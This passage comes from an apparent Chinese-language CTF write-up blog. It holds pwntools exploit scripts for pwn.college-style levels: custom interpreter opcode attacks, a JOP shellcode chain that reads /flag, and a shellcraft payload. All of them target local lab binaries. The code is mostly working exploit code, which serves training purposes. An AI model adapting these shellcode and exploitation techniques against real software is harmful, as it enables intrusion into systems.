class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./l9&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./l9&#x27;</span>)<br>debug(<span class="hljs-number">0x1DA7</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27; </span><br><span class="hljs-string">0x10 0x20 0x4</span><br><span class="hljs-string">arg op+val</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>opcode = p8(<span class="hljs-number">0x10</span>)+p16(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">0x20</span>)+p16(<span class="hljs-number">0x20ff</span>) + p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x20ff</span>)<br>opcode += p8(<span class="hljs-number">0x01</span>) + p16(<span class="hljs-number">0x0840</span>)<br><span class="hljs-comment"># opcode += p64</span><br><br>op2 = <span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;/flag\0\0\0&#x27;</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span> + p8(<span class="hljs-number">0x10</span>)+p16(<span class="hljs-number">0x20ff</span>) + p8(<span class="hljs-number">0x20</span>)+p16(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x2000</span>)<br>op2 += p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0840</span>)<br>op2 += p8(<span class="hljs-number">0x10</span>) + p16(<span class="hljs-number">0x2003</span>) + p8(<span class="hljs-number">0x20</span>)+p16(<span class="hljs-number">0x20a0</span>) + p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x20ff</span>)<br>op2 += p8(<span class="hljs-number">0x01</span>) + p16(<span class="hljs-number">0x0840</span>)<br>op2 += p8(<span class="hljs-number">0x10</span>) + p16(<span class="hljs-number">0x2001</span>) + p8(<span class="hljs-number">0x20</span>)+p16(<span class="hljs-number">0x20a0</span>) + p8(<span class="hljs-number">0x4</span>)+p16(<span class="hljs-number">0x20ff</span>)<br>op2 += p8(<span class="hljs-number">0x08</span>) + p16(<span class="hljs-number">0x0840</span>)<br><br><br>sea(<span class="hljs-string">&quot;Please input your yancode: &quot;</span>,opcode)<br>ru(<span class="hljs-string">&quot;[+] Starting interpreter loop! Good luck!\n&quot;</span>)<br>se(op2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L10-L10-1"><a class="header-anchor" href="#L10-L10-1">Â¶</a>L10,L10.1</h2><p>æ€è·¯æ¯”è¾ƒå¥½ç©ï¼Œé€šè¿‡ open åˆ›å»ºçš„æ–‡ä»¶åæ‹¿ flag å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level10.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level10.1&#x27;</span>)<br><span class="hljs-comment"># opcode = p8(0x20) + p16(0x0400) + +p8(0x10) + p16(0x0400) + p8(0x08) + p16(0x04ff)</span><br><span class="hljs-comment"># Prepare for flag</span><br><span class="hljs-comment"># opcode = p8(0x20) + p16(0x0400) + +p8(0x10) + p16(0x0400) + p8(0x08) + p16(0x04ff)</span><br><span class="hljs-comment"># Prepare for flag</span><br>opcode = p16(<span class="hljs-number">0x0800</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x012f</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x10</span>)<br>opcode += p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0166</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x10</span>)<br>opcode += p16(<span class="hljs-number">0x0802</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x016c</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x10</span>)<br>opcode += p16(<span class="hljs-number">0x0803</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0161</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x10</span>)<br>opcode += p16(<span class="hljs-number">0x0804</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0167</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0801</span>) + p8(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment"># Open</span><br>opcode += p16(<span class="hljs-number">0x0214</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">0x04</span>)<br>opcode += p16(<span class="hljs-number">0x0800</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0100</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x1000</span>) + p8(<span class="hljs-number">0x04</span>)<br>opcode += p16(<span class="hljs-number">0x2140</span>) + p8(<span class="hljs-number">0x08</span>)<br><br><span class="hljs-comment"># Read</span><br>opcode += p16(<span class="hljs-number">0x0803</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x01a0</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x1040</span>) + p8(<span class="hljs-number">0x04</span>)<br>opcode += p16(<span class="hljs-number">0x2020</span>) + p8(<span class="hljs-number">0x01</span>) + p16(<span class="hljs-number">0x2002</span>) + p8(<span class="hljs-number">0x80</span>)<br>opcode += p16(<span class="hljs-number">0x1020</span>) + p8(<span class="hljs-number">0x20</span>)<br><br>opcode += p16(<span class="hljs-number">0x08a0</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x0142</span>) + p8(<span class="hljs-number">0x04</span>) + p16(<span class="hljs-number">0x1007</span>) + p8(<span class="hljs-number">0x04</span>)<br>opcode += p16(<span class="hljs-number">0x0414</span>) + p8(<span class="hljs-number">0x04</span>)<br><br><span class="hljs-comment"># pause()</span><br>sea(<span class="hljs-string">&quot;Please input your yancode: &quot;</span>,opcode)<br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(opcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L11-L11-1"><a class="header-anchor" href="#L11-L11-1">Â¶</a>L11,L11.1</h2><p>ç»å…¸ shellcode JOPã€‚åšå¤æ‚äº† =ã€‚= å…¶å® <code>chmod('/flag',7)</code> å°±å®Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/toddlerone_level11.1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/toddlerone_level11.1&#x27;</span>)<br><span class="hljs-comment"># debug(0x296E)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">8 bytes 24 bytes</span><br><span class="hljs-string">p64(val) + p64(arg) + p64(op)</span><br><span class="hljs-string"></span><br><span class="hljs-string">r10 r11  r12 r13       r9   </span><br><span class="hljs-string">0x40 0x8 0x4 0x2 0x1 0x20 0x10</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>opcode = p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0xc3</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>)  + p64(<span class="hljs-number">0x9999999999999999</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">1</span>)  + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x2</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>&amp;(-<span class="hljs-number">0x808</span>//<span class="hljs-number">8</span>)) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + (asm(<span class="hljs-string">&#x27;xor eax,eax;mov rsi,rsp;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x0a\x00&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + (asm(<span class="hljs-string">&#x27;xor edi,edi;syscall;ret;&#x27;</span>)+<span class="hljs-string">b&#x27;\xeb\x01\x00&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + (asm(<span class="hljs-string">&#x27;pop rdi;ret;&#x27;</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + (asm(<span class="hljs-string">&#x27;pop rsi;ret;&#x27;</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + (asm(<span class="hljs-string">&#x27;pop rdx;ret;&#x27;</span>)+<span class="hljs-string">b&#x27;/flag&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + asm(<span class="hljs-string">&#x27;pop rax;ret;jmp rsi;&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br>opcode += p64(<span class="hljs-number">0x4</span>) + asm(<span class="hljs-string">&#x27;syscall;ret;&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) + p64(<span class="hljs-number">0x8</span>) <span class="hljs-comment"># </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> 0x13370c3:   xor    eax,eax</span><br><span class="hljs-string">   0x13370c5:   mov    rsi,rsp</span><br><span class="hljs-string">   0x13370c8:   jmp    0x13370d4</span><br><span class="hljs-string">   0x13370ca:   add    BYTE PTR [rcx-0x39],cl</span><br><span class="hljs-string">   0x13370cd:   rol    DWORD PTR [rip+0x49000000],0xbc        # 0x4a3370d4</span><br><span class="hljs-string">   0x13370d4:   xor    edi,edi</span><br><span class="hljs-string">   0x13370d6:   syscall</span><br><span class="hljs-string">   0x13370d8:   ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>rdi = <span class="hljs-number">0x13370e5</span><br>rsi = <span class="hljs-number">0x13370f6</span><br>rdx = <span class="hljs-number">0x1337107</span><br>rax = <span class="hljs-number">0x1337118</span><br>jmp_rsi = rax + <span class="hljs-number">2</span><br>syscall_ret =  <span class="hljs-number">0x13370d6</span><br>flag = rdx + <span class="hljs-number">2</span><br><br>sea(<span class="hljs-string">&quot;Please input your yancode:&quot;</span>,opcode)<br>code_chain = flat([rdi,<span class="hljs-number">0x1337000</span>,rsi,<span class="hljs-number">0x1000</span>,rdx,<span class="hljs-number">7</span>,rax,<span class="hljs-number">10</span>,syscall_ret,<br>                    rax,<span class="hljs-number">2</span>,rdi,flag,rdx,<span class="hljs-number">0</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,<br>                    rax,<span class="hljs-number">0</span>,rdi,<span class="hljs-number">3</span>,rdx,<span class="hljs-number">0x100</span>,rsi,<span class="hljs-number">0x1337500</span>,syscall_ret,<br>                    rax,<span class="hljs-number">1</span>,rdi,<span class="hljs-number">1</span>,rdx,<span class="hljs-number">0x100</span>,rsi,<span class="hljs-number">0x1337500</span>,syscall_ret])<br>pause()<br>se(code_chain)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1>ShellcodeExploitation Scenarios(14/14)âœ”</h1><h2 id="L1-v6"><a class="header-anchor" href="#L1-v6">Â¶</a>L1</h2><p>ç™½ç»™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level1&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level1&#x27;</span>)<br><br>se(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L2-v6"><a class="header-anchor" href="#L2-v6">Â¶</a>L2</h2><p>ç”¨ nop å½“æ»‘æ¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;/challenge/babyshell_level2&#x27;</span>)<br>context(arch = elf.arch, os = <span 